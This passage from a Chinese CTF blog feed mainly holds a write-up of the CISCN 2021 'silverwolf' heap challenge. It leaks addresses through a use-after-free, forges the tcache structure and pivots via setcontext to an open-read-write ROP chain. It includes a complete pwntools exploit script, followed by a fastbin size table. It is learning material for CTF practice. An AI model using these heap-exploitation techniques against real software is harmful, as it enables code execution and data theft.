      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>glibc2.27版本下的setcontext入门</p><span id="more"></span><p>例题为[CISCN 2021 初赛]silverwolf</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>关于tcache_perthread_struct在堆中是这样的，在有tcache的libc版本中，会生成一个tcache结构体，大小为0x240</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-3.png"></p><p>内容如下，counts代表了各个大小的堆块的数量，entries代表了每个不同大小堆块的链表头</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-4.png"></p><p>从heap_base + 0x10 开始，前0x40个字节分别代表了 0x20-0x410 0x40个不同大小堆块的数量，这也说明了为什么tcache中能存放的最大堆块是0x408</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-5.png"></p><p>比如从heap_base + 0x10的前16个字节，分别代表了0x20到0x110大小的堆块的数量，对应着下图</p><p>从heap_base + 0x10 + 0x40 开始，就是每个堆链的头地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-6.png"></p><h5 id="2024-7-15补充"><a href="#2024-7-15补充" class="headerlink" title="2024.7.15补充"></a>2024.7.15补充</h5><p>今天在做题的时候碰到tcache大小0x280的情况，调试后发现，其实就是将上面0x240的tcache结构体表示 不同堆块 的大小的数据结构由 1个字节 变为 2个字节，然后存储heap链表头的地址就变成了 heap_base + 0x10 + 0x80</p><h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p>在 setcontext+53的地方，通过设置rdi的值，可以修改除了rax外的所有寄存器，但是在glibc2.29开始，rdi变为了rdx，利用会更加困难，这里先留个空，以后再填上</p><p>在本题中，通过将[rdi+0xa0]设置为ROP的起始地址，赋值给rsp，利用ret指令控制rip执行ROP</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-7.png"></p><h3 id="uaf泄露heap基址"><a href="#uaf泄露heap基址" class="headerlink" title="uaf泄露heap基址"></a>uaf泄露heap基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br></pre></td></tr></table></figure><h3 id="伪造tcache-perthread-struct"><a href="#伪造tcache-perthread-struct" class="headerlink" title="伪造tcache_perthread_struct"></a>伪造tcache_perthread_struct</h3><p>通过伪造tcache_perthread_struct中堆块的个数，将记录大小为0x240的堆块的个数修改为7，并释放tcache_perthread_struct结构体，使其进入unsortbin泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br></pre></td></tr></table></figure><p>这里学到了一个细节，当用ROPgadget查找syscall指令时，某些地址上的syscall指令的下一条指令并不是ret，而当我们编写的ROP执行了这个syscall指令时，因为没有ret，所以rip并不会返回我们的ROP，所以ROP就没办法继续往下执行，而ROPgadget这个工具没办法查询”syscall ; ret”这种指令，而且如果我们直接用ida一个个查找的话，又特别慢，所以我这里有一个办法可以帮助我们更快的查找</p><p>在ida中 shift+f2 执行下方代码即可帮助我们快速寻找“syscall ; ret”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x212D0</span>,<span class="number">0x199b7c</span>):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i)==<span class="number">0xf</span> <span class="keyword">and</span> get_wide_byte(i+<span class="number">1</span>)==<span class="number">0x5</span> <span class="keyword">and</span> get_wide_byte(i+<span class="number">2</span>)==<span class="number">0xc3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/%E5%88%9D%E8%AF%86setcontext-2-17205210992341.png"></p><h3 id="orw-ROP"><a href="#orw-ROP" class="headerlink" title="orw ROP"></a>orw ROP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure><p>这里的话可以把</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br></pre></td></tr></table></figure><p>写成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orw += p64(read)</span><br></pre></td></tr></table></figure><p>read直接用libc查找就可以了，这样可以减少ROP的长度</p><h3 id="布置payload"><a href="#布置payload" class="headerlink" title="布置payload"></a>布置payload</h3><p>pd前40个字节就是各个大小堆块的数量，直接填充0即可，然后就到了堆的链表头，覆盖为如下的地址后即即可实现任意地址写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">edit(pd)</span><br></pre></td></tr></table></figure><p>申请0x10大小的堆块，将__free_hook修改为setcontext，往下同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>当free执行后，rdi会指向free的堆块，并执行setcontext，此时rdi的值就是stack_1，而rdi+0xa0 就是 stack_2，执行 setcontext 后，</p><p>就是将stack_2中存储的值赋值给rsp，stack_2中存储着orw_1，此时rsp中就是orw_1,利用ret指令将其赋值给rip，然后rip就开始执行ROP了</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/silverwolf&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.27.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28997</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11b0</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">    edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">    syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br><span class="line"></span><br><span class="line">    setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">    free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">    flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">    stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">    stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">    orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">    orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">    orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">    pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">    pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">    pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">    pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">    pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">    pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">    edit(pd)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x50</span>)</span><br><span class="line">    edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>)</span><br><span class="line">    edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>)</span><br><span class="line">    edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/setcontext/">setcontext</category>
      
      <category domain="http://example.com/tags/unsortbin-attack/">unsortbin attack</category>
      
      <category domain="http://example.com/tags/tcache-perthread-struct/">tcache_perthread_struct</category>
      
      
      <comments>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>关于fastbin的范围参考</title>
      <link>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/</link>
      <guid>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/</guid>
      <pubDate>Fri, 07 Jun 2024 16:04:06 GMT</pubDate>
      
      <description>&lt;p&gt;关于fastbin的范围参考&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于fastbin的范围参考</p><span id="more"></span><p>来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/">和媳妇一起学Pwn 之 Secret Garden | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p>32位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x8]</td><td align="left">0x10</td><td align="left">[0x01,0x0c] , [1,12]</td><td align="left">[0x10,0x17]</td></tr><tr><td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x10]</td><td align="left">0x18</td><td align="left">[0x0d,0x14] , [13,20]</td><td align="left">[0x18,0x1f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x18]</td><td align="left">0x20</td><td align="left">[0x15,0x1c] , [21,28]</td><td align="left">[0x20,0x27]</td></tr><tr><td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x20]</td><td align="left">0x28</td><td align="left">[0x1d,0x24] , [29,36]</td><td align="left">[0x28,0x2f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x28]</td><td align="left">0x30</td><td align="left">[0x25,0x2c] , [37,44]</td><td align="left">[0x30,0x37]</td></tr><tr><td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x30]</td><td align="left">0x38</td><td align="left">[0x2d,0x34] , [45,52]</td><td align="left">[0x38,0x3f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x38]</td><td align="left">0x40</td><td align="left">[0x35,0x3c] , [53,60]</td><td align="left">[0x40,0x47]</td></tr></tbody></table><p>64 位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x10]</td><td align="left">0x20</td><td align="left">[0x01,0x18] , [1,24]</td><td align="left">[0x20,0x2f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x20]</td><td align="left">0x30</td><td align="left">[0x19,0x28] , [25,40]</td><td align="left">[0x30,0x3f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x30]</td><td align="left">0x40</td><td align="left">[0x29,0x38] , [41,56]</td><td align="left">[0x40,0x4f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x40]</td><td align="left">0x50</td><td align="left">[0x39,0x48] , [57,72]</td><td align="left">[0x50,0x5f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x50]</td><td align="left">0x60</td><td align="left">[0x49,0x58] , [73,88]</td><td align="left">[0x60,0x6f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x60]</td><td align="left">0x70</td><td align="left">[0x59,0x68] , [89,104]</td><td align="left">[0x70,0x7f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x70]</td><td align="left">0x80</td><td align="left">[0x69,0x78] , [105,120]</td><td align="left">[0x80,0x8f]</td></tr></tbody></table>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      
      <comments>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Dragon Knight CTF 2024 pwn wp</title>
      <link>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/</link>
      <guid>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/</guid>
      <pubDate>Sun, 26 May 2024 14:39:09 GMT</pubDate>
      
